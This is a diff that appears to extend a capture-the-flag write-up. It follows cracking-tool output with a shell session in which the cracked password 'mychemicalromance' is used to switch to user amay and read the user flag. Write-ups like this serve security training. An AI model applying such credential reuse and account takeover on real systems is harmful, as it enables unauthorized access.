@@ -504,3 +504,20 @@ Candidates.#2....: 753159 -> dangerous
 Started: Fri Oct  4 02:07:46 2024
 Stopped: Fri Oct  4 02:09:14 2024
 ```
+
+user flag:
+```bash
+$ cd /home
+$ ls
+amay
+geo
+$ su amay
+Password: mychemicalromance
+whoami 
+amay
+cd amay
+ls
+user.txt
+cat user.txt
+1eb95cb28fe6c89ae9265e72e7367266
+```
